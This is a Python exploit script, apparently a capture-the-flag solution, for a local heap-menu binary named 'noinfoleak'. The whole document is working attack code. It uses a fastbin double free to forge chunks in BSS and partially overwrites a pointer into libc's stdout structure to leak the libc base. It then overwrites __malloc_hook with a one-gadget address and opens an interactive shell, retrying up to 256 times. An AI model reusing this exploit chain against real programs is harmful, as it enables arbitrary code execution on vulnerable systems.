#!/usr/bin/env python
from mypwn import *

context.log_level='debug'
context.arch='amd64'
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def menu(i):
    ru('>')
    sl(str(i))

def add(size,content):
    menu(1)
    ru('>')
    sl(str(size))
    ru('>')
    sd(content)

def delete(i):
    menu(2)
    ru('>')
    sl(str(i))

def edit(i,content):
    menu(3)
    ru('>')
    sl(str(i))
    ru('>')
    sd(content)


def debugf(payload=''):
    gdb.attach(p,payload)


def exp():
    add(0x7f,'a'*0x7f)         # 0
    add(0x60,'a'*0x60)         # 1        0x60       0x70        0x7f
    add(0x60,'a'*0x60)         # 2        0x60       0x70
    add(0x7f,'a'*0x7f)         # 3        0x7f       0x90 --> 0x70 + 0x20
    add(0x10,'a'*0x10)         # 4        avoid consolidate

    delete(1)
    delete(2)
    delete(1)

    add(0x60,p64(0x6010A0))    # 5         1
    add(0x60,'a'*0x60)         # 6         2
    add(0x60,'a'*0x60)         # 7         1

    add(0x60,'\x00')           # 8         bss

    payload=p64(0)+p64(0x71)+'\x00'*0x50
    # payload+=p64(0)+p32(0x21)
    edit(1,payload)

    edit(8,'\x60')

    payload=p64(0)*2+p64(0)+p64(0x21)
    edit(1,payload)

    delete(0)

    edit(8,'\x00')
    edit(1,p64(0)+p64(0x91))

    delete(0)

    edit(1,p64(0)+p64(0x71))
    edit(0,'\xdd\x95')

    # debugf('nb 04009D4')

    add(0x60,'a'*0x60)               # 9
    payload='\x00'*0x33+ioleak(0x00000000fbad2887)
    add(0x67,payload)               # 10


    line=ru('>')

    libc_base=u64(line[0x40:0x48])-0x3c5600
    print(hex(libc_base))

    sl('123')


    malloc_hook_target=libc_base+0x3c4b10-0x23

    delete(5)            
    delete(6)            
    delete(5)            

    add(0x60,p64(malloc_hook_target))       # 11
    add(0x60,'a'*0x60)                      # 12
    add(0x60,'a'*0x60)                      # 13

    one_off=0x45216
    one_off=0x4526a
    one_off=0xf02a4
    one_off=0xf1147
    one=libc_base+one_off
    add(0x60,'\x00'*0x13+p64(one))          # 14


    menu(1)
    menu(1)          # why here need to malloc two times

for i in range(0x100):
    try:
        p=process('./noinfoleak')    
        exp()
        p.sendline('ls')
        break
    except:
        continue
    

p.interactive()





